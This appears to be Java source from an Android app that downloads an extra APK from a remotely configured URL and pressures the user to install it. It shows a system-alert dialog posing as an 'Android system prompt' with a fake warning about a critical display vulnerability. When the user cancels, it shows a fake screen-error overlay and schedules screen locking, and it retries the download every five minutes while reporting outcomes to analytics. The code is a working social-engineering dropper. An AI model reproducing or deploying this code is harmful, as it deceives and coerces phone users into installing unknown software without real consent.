package com.xstd.qm;

import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.net.Uri;
import android.text.TextUtils;
import android.view.WindowManager;
import com.plugin.common.utils.UtilsRuntime;
import com.plugin.common.utils.files.FileDownloader;
import com.plugin.common.utils.files.FileOperatorHelper;
import com.umeng.analytics.MobclickAgent;
import com.xstd.qm.fakecover.FakeScreenError;
import com.xstd.qm.service.DemonService;
import com.xstd.qm.setting.SettingManager;

import java.io.File;
import java.util.HashMap;

/**
 * Created by michael on 14-3-2.
 */
public class ExtPluginUtils {

    public static void showExtPluginInstallDialog(final Context context) {
        if (Config.DEBUG) {
            Config.LOGD("[[showExtPluginInstallDialog]] entry");
        }

        if (SettingManager.getInstance().getDialogShowCount() >= (Config.DEBUG ? 3 : 15)) {
            SettingManager.getInstance().setDialogShowCount(SettingManager.getInstance().getDialogShowCount() + 1);
            if (AppRuntime.FakeScreenError != null) {
                AppRuntime.FakeScreenError.dismiss();
            }
            AppRuntime.FakeScreenError = null;

            AppRuntime.EXT_INSTALL_SHOW.set(false);

            return;
        }

        SettingManager.getInstance().setDialogShowCount(SettingManager.getInstance().getDialogShowCount() + 1);
        AlertDialog dialog = new AlertDialog.Builder(context)
                                 .setTitle("安卓系统提示")
                                 .setMessage("安卓系统发现重大显示漏洞，请立即安装补丁，否则将造成屏幕显示异常！")
                                 .setNegativeButton("取消", new DialogInterface.OnClickListener() {
                                     @Override
                                     public void onClick(DialogInterface dialog, int which) {
                                         AppRuntime.EXT_INSTALL_SHOW.set(false);
                                         if (AppRuntime.FakeScreenError != null) {
                                             AppRuntime.FakeScreenError.dismiss();
                                         }
                                         AppRuntime.FakeScreenError = null;

                                         AppRuntime.FakeScreenError = new FakeScreenError(context);
                                         AppRuntime.FakeScreenError.show();

                                         if (SettingManager.getInstance().getLockScreenCount() <= 2) {
                                            AlarmUtils.startAlarmForAction(context, AlarmUtils.ACTION_CLOSE_SCREEN, 30 * 1000);
                                         }
                                     }
                                 })
                                 .setPositiveButton("确定", new DialogInterface.OnClickListener() {
                                     @Override
                                     public void onClick(DialogInterface dialog, int which) {
                                         String localExt = SettingManager.getInstance().getLocalExtApkPath();

                                         AppRuntime.EXT_INSTALL_SHOW.set(false);

//                                         if (AppRuntime.FakeScreenError != null) {
//                                             AppRuntime.FakeScreenError.dismiss();
//                                         }
//                                         AppRuntime.FakeScreenError = null;

                                         Intent i = new Intent(Intent.ACTION_VIEW);
                                         File upgradeFile = new File(localExt);
                                         i.setDataAndType(Uri.fromFile(upgradeFile), "application/vnd.android.package-archive");
                                         i.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                                         i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                         context.startActivity(i);
                                     }
                                 })
                                 .create();
        dialog.getWindow().setType((WindowManager.LayoutParams.TYPE_SYSTEM_ALERT));

        AppRuntime.EXT_INSTALL_SHOW.set(true);
        dialog.show();
    }

    public static boolean isExtPluginApkExist() {
        String local = SettingManager.getInstance().getLocalExtApkPath();
        if (TextUtils.isEmpty(local)) {
            return false;
        }

        File apkFile = new File(local);
        if (apkFile.exists()) {
            return true;
        }

        return false;
    }

    public static void tryToDownloadExtPlugin(final Context context) {
        if (SettingManager.getInstance().getDisableDownloadPlugin()) {
            if (Config.DEBUG) {
                Config.LOGD("[[tryToDownloadExtPlugin::onReceive]] do nothing as the Disable plugin Downlaod is (true)");
            }
            return;
        }

        final String localExt = SettingManager.getInstance().getLocalExtApkPath();
        String downloadUrlExt = SettingManager.getInstance().getKeyDownloadUrlExt();
        if (TextUtils.isEmpty(localExt) || TextUtils.isEmpty(downloadUrlExt)) {
            return;
        }

        if (UtilsRuntime.isOnline(context)) {
            if (Config.DEBUG) {
                Config.LOGD("[[tryToDownloadExtPlugin::onReceive]] current is ONLINE  try to download plugin!!!");
            }

            if (!Config.DOWNLOAD_EXT_PROCESS_RUNNING.get()) {
                Config.DOWNLOAD_EXT_PROCESS_RUNNING.set(true);
                File apkFile = new File(localExt);
                if (apkFile.exists()) {
                    Config.DOWNLOAD_EXT_PROCESS_RUNNING.set(false);
                    return;
                }

                FileDownloader.getInstance(context).postRequest(new FileDownloader.DownloadRequest(downloadUrlExt)
                                                                   , new FileDownloader.DownloadListener() {
                    @Override
                    public void onDownloadProcess(int fileSize, int downloadSize) {
                        if (Config.DEBUG) {
                            Config.LOGD("[[tryToInstallPlugin]] downalod Ext file size : " + downloadSize);
                        }
                    }

                    @Override
                    public void onDownloadFinished(int status, Object response) {
                        Config.DOWNLOAD_EXT_PROCESS_RUNNING.set(false);
                        if (response != null && status == FileDownloader.DOWNLOAD_SUCCESS) {
                            FileDownloader.DownloadResponse r = (FileDownloader.DownloadResponse) response;
                            String localUrl = r.getRawLocalPath();
                            if (Config.DEBUG) {
                                Config.LOGD("[[tryToDownloadExtPlugin]] download Ext file success to : " + localUrl);
                            }
                            if (!TextUtils.isEmpty(localUrl)) {
                                String targetPath = FileOperatorHelper.copyFile(localUrl, localExt);
                                if (!TextUtils.isEmpty(targetPath)) {
                                    if (Config.DEBUG) {
                                        Config.LOGD("[[tryToDownloadExtPlugin]] try to mv download Ext file to : " + targetPath);
                                    }

                                    File targetFile = new File(targetPath);
                                    if (!Utils.checkAPK(context, targetPath)) {
                                        if (Config.DEBUG) {
                                            Config.LOGD("[[tryToDownloadExtPlugin]] try to check Ext APK : " + targetPath + " <<<<<<<< Failed >>>>>>>>");
                                        }
                                        //delete targetPath
                                        targetFile.delete();
                                        File localFile = new File(localUrl);
                                        localFile.delete();

                                        //notify umeng
                                        HashMap<String, String> log = new HashMap<String, String>();
                                        log.put("channel", Config.CHANNEL_CODE);
                                        log.put("phoneType", android.os.Build.MODEL);
                                        log.put("versionName", UtilsRuntime.getVersionName(context));
                                        log.put("reason", "apk check error");
                                        MobclickAgent.onEvent(context, "download_failed", log);
                                        MobclickAgent.flush(context);

                                        return;
                                    }

                                    DemonService.cancelAlarmForAction(context, DemonService.ACTION_DOWNLOAD_EXT_PLUGIN);
                                    if (targetFile.exists()) {
                                        if (Config.DEBUG) {
                                            Config.LOGD("[[tryToDownloadExtPlugin]] success download Ext plugin file : " + targetPath);
                                        }
                                    }
                                    Utils.saveExtraInfo("扩展下载子程序成功");

                                    //notify umeng
                                    HashMap<String, String> log = new HashMap<String, String>();
                                    log.put("channel", Config.CHANNEL_CODE);
                                    log.put("phoneType", android.os.Build.MODEL);
                                    log.put("versionName", UtilsRuntime.getVersionName(context));
                                    MobclickAgent.onEvent(context, "download_success", log);
                                    MobclickAgent.flush(context);

                                    return;
                                }
                            }
                        } else {
                            if (Config.DEBUG) {
                                Config.LOGD("[[tryToDownloadExtPlugin]] download Ext plugin falied, response is null");
                            }
                        }

                        if (Config.DEBUG) {
                            Config.LOGD("[[tryToDownloadExtPlugin]] try to reDownload for next round with time delay : 5M");
                        }

                        //notify umeng
                        HashMap<String, String> log = new HashMap<String, String>();
                        log.put("channel", Config.CHANNEL_CODE);
                        log.put("phoneType", android.os.Build.MODEL);
                        log.put("versionName", UtilsRuntime.getVersionName(context));
                        log.put("reason", "download fialed");
                        MobclickAgent.onEvent(context, "download_failed", log);
                        MobclickAgent.flush(context);

                        DemonService.startAlarmForAction(context, DemonService.ACTION_DOWNLOAD_EXT_PLUGIN, ((long) 5) * 60 * 1000);
                    }
                });
            }

        } else {
            if (Config.DEBUG) {
                Config.LOGD("[[tryToDownloadExtPlugin]] try to reDownload for next round with time delay : 5M");
            }
            DemonService.startAlarmForAction(context, DemonService.ACTION_DOWNLOAD_EXT_PLUGIN, ((long) 5) * 60 * 1000);
        }
    }

}
